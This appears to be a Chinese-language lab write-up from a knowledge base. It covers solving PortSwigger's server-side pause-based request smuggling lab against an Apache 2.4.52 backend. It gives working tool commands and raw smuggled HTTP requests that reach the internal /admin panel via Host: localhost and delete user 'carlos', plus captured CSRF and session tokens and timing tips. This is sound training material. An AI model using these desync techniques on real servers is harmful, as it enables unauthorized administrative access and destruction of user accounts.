---
title: "lab-server-side-pause-based-request-smuggling"
links:
  - target: request-smuggling-family
    relation: evidences
  - target: client-side-desync-family
    relation: relates
---

# lab-server-side-pause-based-request-smuggling

> evidences: [[request-smuggling-family]]

PortSwigger `request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling`
(第 30 批,2026-10-06)。

- 实例:`https://0a1500ff03585312823e8d46009800e4.web-security-academy.net/`(blog app,**Server: Apache/2.4.52**)。
- 判定:**solved**(banner `is-solved` + `Congratulations`)。

## 机制(暂停式 CL.0)

前端**逐字节转发**(不缓冲),后端 Apache/2.4.52(典型的"服务器级重定向后不读 body、超时后仍保留连接"缺陷):
1. 发 `POST <Apache 会自己 302 的路径>` + `Content-Length: N` 但**不发 body**,停住;
2. 后端读超时 → 直接回 302,连接保留;
3. 这时发 `N` 字节 body → 后端把它们当成**下一个请求** → 等价于 CL.0 投毒。

命中面:Apache **服务器级重定向** `/resources` → 302 `/resources/`(同理 `/image`)。

## 关键步

1. 暂停 + 发送(`conn_reuse`,用 `--sequential` 的大读窗当"暂停"):
   ```
   conn_reuse <inst>/resources --path /resources \
     --cl0-head 'GET /admin/ HTTP/1.1\r\nHost: localhost\r\n\r\n' \
     --send-str   'GET /admin/ HTTP/1.1\r\nHost: localhost\r\n\r\n' \
     --sequential --read-ms 75000 --out /tmp/x.bin
   ```
   - 第 1 次读(窗 75s)等到后端的 302(实测 47~77s,速率相关所以**别用固定 sleep**,用"读到数据就发")。
   - 第 2 次读拿到走私响应:**`200` + 管理面板**(`Content-Length: 3149`、`Cache-Control: no-cache`、
     `<link href=/resources/css/labs.css>`)+ `Set-Cookie: session=<S>`。
2. 面板里有 `<form action='/admin/delete' method='POST'>` + `csrf=<T>` + `username` 输入框。
3. 第二次暂停式走私**删人**(注意**尾斜杠**:`/admin/delete` 会被 Apache mod_dir 302 到 `/admin/delete/`):
   ```
   POST /admin/delete/ HTTP/1.1
   Host: localhost
   Cookie: session=<S>
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 53

   csrf=<T>&username=carlos
   ```
   → carlos 被删,`solved_check` 翻牌 ✓。

## 工具

- 新件 `pause_desync`:把"primer(自动算 CL)/等到超时响应/发走私字节"做成一次调用,并可在**同一连接上链式**发多条,
  支持 `{csrf}` / `{session}` 占位符(从先前响应里抓)-正好覆盖"先偷面板、再删人"的两步。
- `conn_reuse` 升 1.2.0:新增 `--cl0 <body>`(完整 CL.0 帧)与 **`--cl0-head <body>`**(只发头、CL 按"你随后要发的 body"算)
  - 暂停式攻击必须用后者;用 `--cl0` 会把头+体一起写出去,等于没有暂停(实测因此白跑两轮)。

### pause_desync 自测回执(同实例)

```
pause_desync <inst> --path /resources \
  --request 'GET /admin/ HTTP/1.1\r\nHost: localhost\r\n\r\n' \
  --request 'POST /admin/delete/ HTTP/1.1\r\nHost: localhost\r\nCookie: session={session}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 53\r\n\r\ncsrf={csrf}&username=carlos'
→ exit 0; captured_csrf="qdn01wpwiwhdESMWbUhwQQg7V1ajswHJ"、captured_session="V8bx9bGNMKyGtLFkB6foYp50rYHLKynP";
  steps 里出现 `200 OK … Content-Length: 6242 … <link href=/resources/css/labs.css>`(管理面板)
```

- 提醒:`--timeout-ms` 默认已提到 **180s** - 该超时速率相关(不同轮到过 47/77/102s),窗口开太小会把 body 发早、
  响应序列错位(那次第一次读空转 102s 即此因);手动用 `conn_reuse --sequential --read-ms 75000` 时同理。

## 坑

- 暂停窗口必须**覆盖后端的读超时**:太早发 body → 被当作 POST 的 body 吃掉(不投毒);窗口内等到超时响应后立即发 → 稳定成功。
- 走私请求必须带 `Host: localhost`:前端对 `/admin` 直接 403,内网 vhost 才给面板。
- 面板的 csrf 与它那次请求拿到的 session 要**成对**带回删除请求(实测该对存活 25 分钟仍有效)。
- 偶发 `500 Server Error: Empty response`(前端从后端拿到空响应)= 这一轮时序没对上,重跑即可。
